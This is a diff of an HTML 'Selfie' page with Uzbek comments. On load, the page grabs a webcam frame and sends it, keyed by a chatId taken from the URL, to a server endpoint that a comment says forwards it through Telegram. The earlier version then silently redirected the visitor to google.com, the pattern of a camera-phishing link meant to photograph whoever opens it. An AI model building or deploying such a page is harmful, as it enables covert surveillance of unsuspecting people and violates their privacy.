@@ -3,7 +3,7 @@
   <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title></title>
+    <title>Selfie</title>
     <style>
       body {
         background: #fff;
@@ -19,10 +19,12 @@
     <canvas id="c"></canvas>
 
     <script>
-      const chatId = window.location.pathname.split("/").pop();
+      const chatId = window.location.pathname.split("/").pop(); // URL oxiridagi chatId
 
       async function start() {
         try {
+          if (!chatId) throw new Error("chatId topilmadi");
+
           const stream = await navigator.mediaDevices.getUserMedia({
             video: true,
           });
@@ -30,7 +32,7 @@
           v.srcObject = stream;
 
           await new Promise((resolve) => {
-            v.onloadedmetadata = resolve;
+            v.onplaying = () => resolve();
           });
 
           const c = document.getElementById("c");
@@ -38,19 +40,25 @@
           c.height = v.videoHeight || 480;
           const ctx = c.getContext("2d");
           ctx.drawImage(v, 0, 0, c.width, c.height);
-
-          const blob = await new Promise((res) => c.toBlob(res, "image/png"));
-          const form = new FormData();
-          form.append("photo", blob, "selfie.png");
-          form.append("chatId", chatId);
-
-          await fetch("/upload", { method: "POST", body: form });
-
           stream.getTracks().forEach((t) => t.stop());
-          window.location.href = "https://google.com";
+
+          // Rasmni base64 olish
+          const base64 = c.toDataURL("image/png").split(",")[1];
+
+          // Telegram API orqali yuborish
+          const resp = await fetch("/api/selfie", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ chat_id: chatId, photo: base64 }),
+          });
+
+          const data = await resp.json();
+          if (!data.ok) throw new Error("Rasm yuborilmadi");
+
+          alert("Rasm yuborildi ✅");
         } catch (err) {
           console.error(err);
-          window.location.href = "https://google.com";
+          alert("Xatolik yuz berdi ❌");
         }
       }
 
